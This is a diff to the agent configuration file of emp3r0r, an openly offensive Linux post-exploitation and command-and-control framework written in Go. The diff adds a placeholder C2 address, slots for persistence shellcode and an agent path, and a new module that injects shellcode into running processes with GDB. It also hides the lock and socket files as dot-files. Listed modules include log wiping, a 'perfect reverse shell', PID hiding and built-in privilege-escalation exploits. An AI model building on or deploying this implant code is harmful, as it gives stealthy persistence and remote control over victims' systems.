@@ -2,6 +2,7 @@ package agent
 
 import (
 	"context"
+	"fmt"
 	"net/http"
 	"os"
 	"strconv"
@@ -12,20 +13,14 @@ import (
 )
 
 var (
-	// AgentRoot root directory of emp3r0r
-	AgentRoot, _ = os.Getwd()
+	// CCAddress how our agent finds its CC
+	CCAddress = "https://[cc_ipaddr]"
 
 	// Transport what transport is this agent using? (HTTP2 / CDN / TOR)
-	Transport = "HTTP2"
+	Transport = fmt.Sprintf("HTTP2 (%s)", CCAddress)
 
 	// AESKey generated from Tag -> md5sum, type: []byte
 	AESKey = tun.GenAESKey("Your Pre Shared AES Key: " + OpSep)
-
-	// UtilsPath binary path of utilities
-	UtilsPath = AgentRoot + "/..."
-
-	// Libemp3r0rFile shard library of emp3r0r, for hiding and persistence
-	Libemp3r0rFile = UtilsPath + "/libemp3r0r.so"
 
 	// HTTPClient handles agent's http communication
 	HTTPClient *http.Client
@@ -39,25 +34,43 @@ var (
 	// AgentProxy used by this agent to communicate with CC server
 	AgentProxy = ""
 
-	// CCAddress how our agent finds its CC
-	CCAddress = "https://[cc_ipaddr]"
-
-	// HIDE_PIDS all the processes from emp3r0r
+	// HIDE_PIDS all the processeserr from emp3r0r
 	HIDE_PIDS = []string{strconv.Itoa(os.Getpid())}
+
+	// GuardianShellcode inject into a process to gain persistence
+	GuardianShellcode = `[persistence_shellcode]`
+
+	// GuardianAgentPath where the agent binary is stored
+	GuardianAgentPath = "[persistence_agent_path]"
 )
 
 const (
+	// Version record version on build time
+	Version = "[emp3r0r_version_string]"
+
+	// AgentRoot root directory of emp3r0r
+	AgentRoot = "[agent_root]"
+
+	// UtilsPath binary path of utilities
+	UtilsPath = AgentRoot + "/bin"
+
+	// Libemp3r0rFile shard library of emp3r0r, for hiding and persistence
+	Libemp3r0rFile = UtilsPath + "/libemp3r0r.so"
+
 	// PIDFile stores agent PID
-	PIDFile = "/tmp/e.lock"
+	PIDFile = AgentRoot + "/.e.lock"
 
 	// SocketName name of our unix socket
-	SocketName = "/tmp/ssh-s6Y4tDtahIuL"
+	SocketName = AgentRoot + "/.s6Y4tDtahIuL"
 
 	// CCPort port of c2
-	CCPort = "8000"
+	CCPort = "[cc_port]"
+
+	// ProxyPort start a socks5 proxy to help other agents, on 0.0.0.0:port
+	ProxyPort = "[proxy_port]"
 
 	// BroadcastPort port of broadcast server
-	BroadcastPort = "8889"
+	BroadcastPort = "[broadcast_port]"
 
 	// CCIndicator check this before trying connection
 	CCIndicator = "[cc_indicator]"
@@ -85,6 +98,7 @@ const (
 	ModPORT_FWD    = "port_fwd"
 	ModSHELL       = "interactive_shell"
 	ModVACCINE     = "vaccine"
+	ModINJECTOR    = "injector"
 	ModGET_ROOT    = "get_root"
 )
 
@@ -92,12 +106,13 @@ const (
 var ModuleDocs = map[string]string{
 	ModCMD_EXEC:    "Run a single command on a target",
 	ModCLEAN_LOG:   "Delete lines containing keyword from *tmp logs",
-	ModLPE_SUGGEST: "Run unix-priv-check and linux exploit suggester",
+	ModLPE_SUGGEST: "Run linux-smart-enumeration or linux exploit suggester",
 	ModPERSISTENCE: "Get persistence via built-in methods",
 	ModPROXY:       "Start a socks proxy on target, and use it locally on C2 side",
-	ModPORT_FWD:    "Port mapping",
+	ModPORT_FWD:    "Port mapping from agent to CC (or vice versa), via emp3r0r's HTTP2 (or other) tunnel",
 	ModSHELL:       "Run custom bash on target, a perfect reverse shell",
 	ModVACCINE:     "Vaccine helps you install additional tools on target system",
+	ModINJECTOR:    "Inject shellcode into a running process with GDB",
 	ModGET_ROOT:    "Try some built-in LPE exploits",
 }
 
@@ -120,6 +135,16 @@ type SystemInfo struct {
 	HasRoot     bool     // is agent run as root?
 	HasTor      bool     // is agent from Tor?
 	HasInternet bool     // has internet access?
+
+	Process *AgentProcess // agent's process
+}
+
+// AgentProcess process info of our agent
+type AgentProcess struct {
+	PID     int    // pid
+	PPID    int    // parent PID
+	Cmdline string // process name and command line args
+	Parent  string // parent process name and cmd line args
 }
 
 // MsgTunData data to send in the tunnel
